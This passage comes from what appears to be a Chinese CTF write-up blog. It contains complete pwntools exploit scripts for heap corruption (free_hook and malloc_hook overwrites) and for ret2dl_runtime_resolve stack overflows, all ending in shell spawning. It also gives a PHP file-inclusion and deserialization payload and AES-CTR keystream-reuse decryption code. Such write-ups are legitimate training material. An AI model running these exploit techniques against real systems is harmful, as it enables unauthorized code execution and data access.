class="hljs-number">0x602060</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">()</span>:</span> create(<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x20</span>)<span class="hljs-comment">#0</span>create(<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x20</span>)<span class="hljs-comment">#1</span>create(<span class="hljs-number">0x60</span>,<span class="hljs-string">"b"</span>*<span class="hljs-number">0x20</span>)<span class="hljs-comment">#2</span>delete(<span class="hljs-number">0</span>)delete(<span class="hljs-number">1</span>)create(<span class="hljs-number">0x60</span>,<span class="hljs-string">"a"</span>)<span class="hljs-comment">#0</span>show()p.recvuntil(<span class="hljs-string">"0 : a"</span>)data = <span class="hljs-string">"\x00"</span>+p.recvuntil(<span class="hljs-string">"2"</span>,drop=<span class="hljs-keyword">True</span>)heap = u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-keyword">print</span> <span class="hljs-string">"[*]heap : "</span>, hex(heap)create(<span class="hljs-number">0x100</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x20</span>)<span class="hljs-comment">#1</span>create(<span class="hljs-number">0x100</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x20</span>)<span class="hljs-comment">#3</span>delete(<span class="hljs-number">1</span>)create(<span class="hljs-number">0x20</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x20</span>)<span class="hljs-comment">#1</span>create(<span class="hljs-number">0xd0</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>)<span class="hljs-comment">#4</span>show()p.recvuntil(<span class="hljs-string">"4 : aaaaaaaa"</span>)data = p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">"\x00\x00"</span>libc_base = u64(data) - <span class="hljs-number">0x3c4b78</span>malloc_hook = libc_base + <span class="hljs-number">0x3c4b10</span>one_shot = libc_base + <span class="hljs-number">0xf02a4</span>free_hook = libc_base + <span class="hljs-number">0x3c67a8</span>system = libc_base + <span class="hljs-number">0x45390</span><span class="hljs-keyword">print</span> <span class="hljs-string">'[*]libc_base : '</span>,hex(libc_base)<span class="hljs-keyword">print</span> <span class="hljs-string">'[*]malloc_hook : '</span>,hex(malloc_hook)<span class="hljs-keyword">print</span> <span class="hljs-string">'[*]free_hook : '</span>,hex(free_hook)<span class="hljs-keyword">print</span> <span class="hljs-string">'[*]one_shot : '</span>,hex(one_shot)<span class="hljs-keyword">print</span> <span class="hljs-string">'[*]system : '</span>,hex(system)index = (heap - chunk_list + <span class="hljs-number">8</span>)/<span class="hljs-number">0x10</span> + <span class="hljs-number">15</span><span class="hljs-keyword">print</span> <span class="hljs-string">'[*]index : '</span>,hex(index)change(<span class="hljs-number">2</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>+p64(heap+<span class="hljs-number">0x10</span>))create(<span class="hljs-number">0x71</span>,<span class="hljs-string">"h"</span>*<span class="hljs-number">0x71</span>)<span class="hljs-comment">#5</span>create(<span class="hljs-number">0x60</span>,<span class="hljs-string">"e"</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#6</span>create(<span class="hljs-number">0x60</span>,<span class="hljs-string">"b"</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span><span class="hljs-comment">#gdb.attach(p)</span>delete(<span class="hljs-number">6</span>)delete(<span class="hljs-number">7</span>)delete(index)create(<span class="hljs-number">0x60</span>,p64(<span class="hljs-number">0x6020a8</span>)) <span class="hljs-comment">#6</span>create(<span class="hljs-number">0x60</span>,<span class="hljs-string">"c"</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span>create(<span class="hljs-number">0x60</span>,<span class="hljs-string">"/bin/sh\x00"</span>) <span class="hljs-comment">#8</span>payload = p64(free_hook) + p64(<span class="hljs-number">0x20</span>) + p64(heap+<span class="hljs-number">0x10</span>) payload = payload.ljust(<span class="hljs-number">0x60</span>,<span class="hljs-string">"\x00"</span>)create(<span class="hljs-number">0x60</span>, payload) <span class="hljs-comment">#9</span>show()change(<span class="hljs-number">5</span>,p64(system))delete(<span class="hljs-number">6</span>)p.recv()<span class="hljs-comment">#gdb.attach(p)</span>p.interactive() exp()</code></pre></p><p>最后成功 getshell<br><img src="/img/2019-04-23/4.png" srcset="/img/static/loading.gif" alt="4"></p><h4 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h4><p>直接<code>read</code>读入<code>0x100</code>直接造成栈溢出，但是这题的难点在于没有泄露函数，不能直接<code>return to libc</code>，所以这里利用<code>ret2_dl_runtime_resolve</code>，之前做过0ctf2018的babystack 跟这个类似，先是尝试了<code>roputils</code>库实现，后来发现有点问题总是调不对，后来直接手工干了一波。操作如下：<br><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span><span class="hljs-comment">#p = process('./pwn')</span>p = remote(ip,port)elf = ELF(<span class="hljs-string">'./pwn'</span>)read_plt = elf.plt[<span class="hljs-string">'read'</span>]alarm_plt = elf.plt[<span class="hljs-string">'alarm'</span>]pop_ebp_ret = <span class="hljs-number">0x080485db</span>ppp_ret = <span class="hljs-number">0x080485d9</span>pp_ebp_ret = <span class="hljs-number">0x080485da</span>leave_ret = <span class="hljs-number">0x08048448</span>stack_size = <span class="hljs-number">0x800</span>bss_addr = <span class="hljs-number">0x0804a040</span> <span class="hljs-comment">#readelf -S babystack | grep ".bss" base_stage = bss_addr + stack_size</span>plt_0 = <span class="hljs-number">0x8048380</span> <span class="hljs-comment"># objdump -d -j .plt babystack</span>rel_plt = <span class="hljs-number">0x804833c</span> <span class="hljs-comment"># objdump -s -j .rel.plt babystack index_offset = (base_stage + 28) - rel_plt</span>alarm_got = elf.got[<span class="hljs-string">'alarm'</span>]<span class="hljs-keyword">print</span> <span class="hljs-string">"alarm_got: "</span>,hex(alarm_got)<span class="hljs-keyword">print</span> <span class="hljs-string">"alarm_plt: "</span>,hex(alarm_plt)<span class="hljs-keyword">print</span> <span class="hljs-string">"read_plt: "</span>,hex(read_plt)dynsym = <span class="hljs-number">0x80481DC</span>dynstr = <span class="hljs-number">0x804827C</span>fake_sym_addr = base_stage + <span class="hljs-number">36</span>align = <span class="hljs-number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="hljs-number">0xf</span>) fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / <span class="hljs-number">0x10</span>r_info = index_dynsym &lt;&lt; <span class="hljs-number">8</span> | <span class="hljs-number">0x7</span>fake_reloc = p32(alarm_got) + p32(r_info)st_name = fake_sym_addr + <span class="hljs-number">0x10</span> - dynstrfake_sym = p32(st_name) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x12</span>)payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x28</span> + p32(bss_addr)payload += p32(read_plt) + p32(leave_ret) + p32(<span class="hljs-number">0</span>) + p32(bss_addr) + p32(<span class="hljs-number">36</span>)<span class="hljs-comment">#raw_input("go:")</span>p.send(payload)<span class="hljs-comment">#fake stack 1 bss_addr</span>payload1 = <span class="hljs-string">'aaaa'</span> <span class="hljs-comment">#pop ebp</span>payload1 += p32(read_plt) + p32(ppp_ret) + p32(<span class="hljs-number">0</span>) + p32(base_stage) + p32(<span class="hljs-number">100</span>) payload1 += p32(pop_ebp_ret) + p32(base_stage) <span class="hljs-comment">#fake stack again</span>payload1 += p32(leave_ret) <span class="hljs-comment">#leave: mov esp,ebp; pop ebp</span>p.send(payload1)cmd = <span class="hljs-string">"/bin/sh"</span><span class="hljs-comment">#fake stack 2 base_stage</span>payload2 = <span class="hljs-string">'bbbb'</span>payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += <span class="hljs-string">'aaaa'</span>payload2 += p32(base_stage + <span class="hljs-number">80</span>)payload2 += <span class="hljs-string">'aaaa'</span>payload2 += <span class="hljs-string">'aaaa'</span>payload2 += fake_reloc <span class="hljs-comment">#base_stage+28</span>payload2 += <span class="hljs-string">'b'</span> * alignpayload2 += fake_sym <span class="hljs-comment">#base_stage+36</span>payload2 += <span class="hljs-string">"system\x00"</span>payload2 += <span class="hljs-string">'a'</span> * (<span class="hljs-number">80</span> - len(payload2))payload2 += cmd +<span class="hljs-string">'\x00'</span><span class="hljs-comment">#payload2 += 'a' * (100 - len(payload2))</span><span class="hljs-keyword">print</span> len(payload2)sleep(<span class="hljs-number">1</span>)p.sendline(payload2)<span class="hljs-comment">#p.sendline("icq0030af22ece42d03523c08138525f")</span>p.interactive()</code></pre></p><p><img src="/img/2019-04-23/22.png" srcset="/img/static/loading.gif" alt="22"></p><h4 id="double"><a href="#double" class="headerlink" title="double"></a>double</h4><p><img src="/img/2019-04-23/5.png" srcset="/img/static/loading.gif" alt="5"><br>由于这个对比，只要输入的<code>data</code>相同则不会分配堆块给<code>data</code>，造成两个指针指向同一个<code>data</code>。只要申请两个相同内容大小为<code>smallbin</code>，<code>free</code>掉 一个指针，<code>show</code>另一个指针即可获得<code>libc</code>的地址。同理只要<code>free</code>掉其中一个，在对另一个相同指向的指针进行<code>edit</code>，就可以改变<code>fd</code>。将<code>fd</code>改成<code>malloc_hook</code>，再将<code>malloc_hook</code>的值改成<code>one_gadget</code>即可getshell。<br>详细脚本如下：<br><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')</span>local = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> local:p = process(<span class="hljs-string">"./pwn"</span>)<span class="hljs-keyword">else</span>:p = remote(<span class="hljs-string">"39.97.228.196"</span>,<span class="hljs-number">60004</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(content)</span>:</span>p.recvuntil(<span class="hljs-string">"&gt; "</span>)p.sendline(<span class="hljs-string">"1"</span>)sleep(<span class="hljs-number">0.1</span>)p.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>p.recvuntil(<span class="hljs-string">"&gt; "</span>)p.sendline(<span class="hljs-string">"2"</span>)p.recv()p.sendline(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,content)</span>:</span>p.recvuntil(<span class="hljs-string">"&gt; "</span>)p.sendline(<span class="hljs-string">"3"</span>)p.recv()p.sendline(str(index))sleep(<span class="hljs-number">0.1</span>)p.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span>p.recvuntil(<span class="hljs-string">"&gt; "</span>)p.sendline(<span class="hljs-string">"4"</span>)p.recv()p.sendline(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">()</span>:</span> create(<span class="hljs-string">"1"</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span>create(<span class="hljs-string">"1"</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#1</span>create(<span class="hljs-string">"2"</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2</span>create(<span class="hljs-string">"3"</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span>create(<span class="hljs-string">"3"</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4</span>free(<span class="hljs-number">3</span>)show(<span class="hljs-number">4</span>)<span class="hljs-keyword">if</span> local:<span class="hljs-keyword">pass</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">pass</span><span class="hljs-comment">#p.recvuntil("Info index: ")</span><span class="hljs-comment">#p.recvuntil("Info index: ")</span>data = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-keyword">True</span>)+<span class="hljs-string">"\x00\x00"</span>) libc_base = data - <span class="hljs-number">0x3c4b78</span>malloc_hook = libc_base + <span class="hljs-number">0x3c4b10</span>one_shot = libc_base + <span class="hljs-number">0xf02a4</span> print(<span class="hljs-string">"malloc_hook = "</span> + str(hex(malloc_hook))) print(<span class="hljs-string">"one_shot = "</span> + str(hex(one_shot))) free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)edit(<span class="hljs-number">0</span>,p64(malloc_hook - <span class="hljs-number">19</span>))create(<span class="hljs-string">"4"</span>*<span class="hljs-number">0x60</span>)create(<span class="hljs-string">"5"</span>*<span class="hljs-number">0x60</span>)payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">3</span> + p64(one_shot)payload = payload.ljust(<span class="hljs-number">0x60</span>,<span class="hljs-string">"\x00"</span>)create(payload)create(<span class="hljs-string">"icq0030af22ece42d03523c08138525f"</span>)p.interactive()exp()</code></pre></p><p><img src="/img/2019-04-23/6.png" srcset="/img/static/loading.gif" alt="6"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="justSoso"><a href="#justSoso" class="headerlink" title="justSoso"></a>justSoso</h4><p><code>http://d466a1d4c1214b3181516b834f0de419f413fd793ae942d0.changame.ichunqiu.com/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code><br>通过文件包含拿到hint.php和index.php的源码<br><pre><code class="hljs php"><span class="hljs-comment">//index.php</span>&lt;html&gt;<span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>); $file = $_GET[<span class="hljs-string">"file"</span>]; $payload = $_GET[<span class="hljs-string">"payload"</span>];<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($file))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'Missing parameter'</span>.<span class="hljs-string">'&lt;br&gt;'</span>;&#125;<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/flag/"</span>,$file))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">'hack attacked!!!'</span>);&#125;@<span class="hljs-keyword">include</span>($file);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($payload))&#123;      $url = parse_url($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>]);    parse_str($url[<span class="hljs-string">'query'</span>],$query);    <span class="hljs-keyword">foreach</span>($query <span class="hljs-keyword">as</span> $value)&#123;        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/flag/"</span>,$value)) &#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">'stop hacking!'</span>);        <span class="hljs-keyword">exit</span>();        &#125;    &#125;    $payload = unserialize($payload);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Missing parameters"</span>; &#125; <span class="hljs-meta">?&gt;</span>&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt;<span class="hljs-comment">//hint.php</span><span class="hljs-meta">&lt;?php</span>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;     <span class="hljs-keyword">private</span> $handle;      <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">foreach</span>(get_object_vars(<span class="hljs-keyword">$this</span>) <span class="hljs-keyword">as</span> $k =&gt; $v) &#123;            <span class="hljs-keyword">$this</span>-&gt;$k = <span class="hljs-keyword">null</span>;        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Waking up\n"</span>;    &#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($handle)</span> </span>&#123;         <span class="hljs-keyword">$this</span>-&gt;handle = $handle;     &#125; <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">$this</span>-&gt;handle-&gt;getFlag();&#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;    <span class="hljs-keyword">public</span> $file;    <span class="hljs-keyword">public</span> $token;    <span class="hljs-keyword">public</span> $token_flag;     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($file)</span></span>&#123;<span class="hljs-keyword">$this</span>-&gt;file = $file;<span class="hljs-keyword">$this</span>-&gt;token_flag = <span class="hljs-keyword">$this</span>-&gt;token = md5(rand(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>));    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">$this</span>-&gt;token_flag = md5(rand(<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>));        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;token === <span class="hljs-keyword">$this</span>-&gt;token_flag)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;<span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file,<span class="hljs-keyword">true</span>);             &#125;          &#125;    &#125;&#125;?</code></pre></p><p>parse_url存在绕过的漏洞，例如：<code>http://127.0.0.1///index.php</code><br>构造payload<br><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;    <span class="hljs-keyword">private</span> $handle;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($handle)</span> </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;handle = $handle;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;handle-&gt;getFlag();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;    <span class="hljs-keyword">public</span> $file;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($file)</span></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;file = $file;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;            <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file,<span class="hljs-keyword">true</span>);        &#125;    &#125;&#125;$flag = <span class="hljs-keyword">new</span> Flag(<span class="hljs-string">'flag.php'</span>);$flag -&gt;token = &amp;$flag -&gt; token_flag;$exp = <span class="hljs-keyword">new</span> Handle($flag);<span class="hljs-keyword">echo</span> urlencode(serialize($exp)).PHP_EOL;<span class="hljs-meta">?&gt;</span></code></pre></p><p>得到以下payload<br><pre><code class="hljs undefined">O<span class="hljs-meta">%3A6</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22Handle</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A1</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A14</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22</span><span class="hljs-meta">%00Handle</span><span class="hljs-meta">%00handle</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BO</span><span class="hljs-meta">%3A4</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22Flag</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A4</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22file</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A8</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22flag</span>.php<span class="hljs-meta">%22</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A10</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22token_flag</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BN</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A5</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22token</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BR</span><span class="hljs-meta">%3A4</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%7D</span><span class="hljs-meta">%7D</span>urldecode:O:<span class="hljs-number">6</span>:<span class="hljs-string">"Handle"</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">".Handle.handle"</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">"Flag"</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">"file"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"flag.php"</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"token_flag"</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">"token"</span>;R:<span class="hljs-number">4</span>;&#125;&#125;</code></pre></p><p>还要把一个的1改为2，不然会跳进Waking up函数<br><pre><code class="hljs undefined">O<span class="hljs-meta">%3A6</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22Handle</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A2</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A14</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22</span><span class="hljs-meta">%00Handle</span><span class="hljs-meta">%00handle</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BO</span><span class="hljs-meta">%3A4</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22Flag</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A4</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22file</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A8</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22flag</span>.php<span class="hljs-meta">%22</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A10</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22token_flag</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BN</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A5</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22token</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BR</span><span class="hljs-meta">%3A4</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%7D</span><span class="hljs-meta">%7D</span>urldecode:O:<span class="hljs-number">6</span>:<span class="hljs-string">"Handle"</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">".Handle.handle"</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">"Flag"</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">"file"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"flag.php"</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"token_flag"</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">"token"</span>;R:<span class="hljs-number">4</span>;&#125;&#125;</code></pre></p><p><img src="/img/2019-04-23/8.png" srcset="/img/static/loading.gif" alt="8"></p><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h4><h5 id="question-0"><a href="#question-0" class="headerlink" title="question-0"></a>question-0</h5><p><img src="/img/2019-04-23/10.png" srcset="/img/static/loading.gif" alt="10"><br><pre><code class="hljs undefined"><span class="hljs-symbol">a1:</span><span class="hljs-number">0xfa6</span><span class="hljs-symbol">a2:</span><span class="hljs-number">0xbed</span><span class="hljs-symbol">a3:</span><span class="hljs-number">0x9c7</span><span class="hljs-symbol">a4:</span><span class="hljs-number">0xa00</span></code></pre></p><h5 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h5><p>看到这三个数都是素数，猜想part1也可能是素数。google到如下的素数表<br><img src="/img/2019-04-23/11.png" srcset="/img/static/loading.gif" alt="11"><br>猜测part1所在位置，根据素数之间的间隔相等的原则，猜出part1为26365399</p><h5 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h5><p><img src="/img/2019-04-23/12.png" srcset="/img/static/loading.gif" alt="12"><br>脚本也可解：<br><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy <span class="hljs-keyword">as</span> syx = sy.symbols(<span class="hljs-string">'x'</span>)print(sy.integrate(sy.exp(x)*pow(<span class="hljs-number">4</span> + sy.exp(x),<span class="hljs-number">2</span>), (x, float(<span class="hljs-number">0</span>), sy.log(<span class="hljs-number">2</span>)))) rerult : <span class="hljs-number">30.3333333333333</span>(<span class="hljs-number">1</span>+<span class="hljs-number">30.3333333</span>≈<span class="hljs-number">9</span>*<span class="hljs-number">31</span>+<span class="hljs-number">7</span>+<span class="hljs-number">1</span>)=<span class="hljs-number">100</span>part2 = （<span class="hljs-number">1</span>+<span class="hljs-number">91</span>+<span class="hljs-number">7</span>+<span class="hljs-number">1</span>）*<span class="hljs-number">77</span> =<span class="hljs-number">7700</span>hex(<span class="hljs-number">7700</span>)=<span class="hljs-number">0x1e14</span></code></pre></p><h5 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h5><p><img src="/img/2019-04-23/13.png" srcset="/img/static/loading.gif" alt="13"><br><img src="/img/2019-04-23/14.png" srcset="/img/static/loading.gif" alt="14"><br>part3 = 0x48d0</p><h5 id="part4"><a href="#part4" class="headerlink" title="part4"></a>part4</h5><p><img src="/img/2019-04-23/15.png" srcset="/img/static/loading.gif" alt="15"><br><img src="/img/2019-04-23/16.png" srcset="/img/static/loading.gif" alt="16"><br>part 4 =hex(40320)=0x9d80</p><h4 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h4><p>本题是AES_CTR加密，而这个加密方式就是分组对明文进行异或，因为在同一次通信中其中的key和计数器不变，所以明文异或的密钥不会变，因此我们可以在通信过程可以通过输入不同的填充获得密钥。经过测试可以发现，32 个一个分组，flag有两个分组多一些，可以先填充5个让flag加填充满足有3_32个，得到第一个需要的密文data1，然后填充5+48获得第二个密文，第二个密文(data2)有6_32个bit。<br>则详细脚本如下：<br><pre><code class="hljs python">data1 = <span class="hljs-string">"aefdd88c71194ba242a1e45c7a03f1e8715e11c3566607ee614c8cd4541f3688f0e5a35146b5cca393c8432dafdccee7"</span> data2 = <span class="hljs-string">"aefdd88c711e46a244bbbc0d2d51f1bb26085d90026603a234188c86184734dff4a9f40244e4c8a0c3cd407eab84d287ec9ece135f9a2a6bc7d427cd18e7c7995985df9d61d1b697d5472b073c27a6b0d5245917d3b1965248a6c228d6f260d4"</span>s1 = [data1[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>],data1[<span class="hljs-number">32</span>:<span class="hljs-number">32</span>*<span class="hljs-number">2</span>],data1[<span class="hljs-number">32</span>*<span class="hljs-number">2</span>:<span class="hljs-number">32</span>*<span class="hljs-number">3</span>]]s2 = [data2[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>],data2[<span class="hljs-number">32</span>:<span class="hljs-number">32</span>*<span class="hljs-number">2</span>],data2[<span class="hljs-number">32</span>*<span class="hljs-number">2</span>:<span class="hljs-number">32</span>*<span class="hljs-number">3</span>],data2[<span class="hljs-number">32</span>*<span class="hljs-number">3</span>:<span class="hljs-number">32</span>*<span class="hljs-number">4</span>],data2[<span class="hljs-number">32</span>*<span class="hljs-number">4</span>:<span class="hljs-number">32</span>*<span class="hljs-number">5</span>], data2[<span class="hljs-number">32</span>*<span class="hljs-number">5</span>:<span class="hljs-number">32</span>*<span class="hljs-number">6</span>]]ming=<span class="hljs-string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>minghex=ming.encode(<span class="hljs-string">"hex"</span>)key1=int(s1[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)^int(minghex,<span class="hljs-number">16</span>)key2=int(s1[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)^int(minghex,<span class="hljs-number">16</span>)key3=int(s1[<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)^int(minghex,<span class="hljs-number">16</span>)minghex0=int(s2[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)^key1minghex1=int(s2[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)^key2minghex2=int(s2[<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)^key3<span class="hljs-keyword">print</span> hex(minghex0)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>].decode(<span class="hljs-string">"hex"</span>)<span class="hljs-keyword">print</span> hex(minghex1)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>].decode(<span class="hljs-string">"hex"</span>)<span class="hljs-keyword">print</span> hex(minghex2)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>].decode(<span class="hljs-string">"hex"</span>)</code></pre></p><p><img src="/img/2019-04-23/17.png" 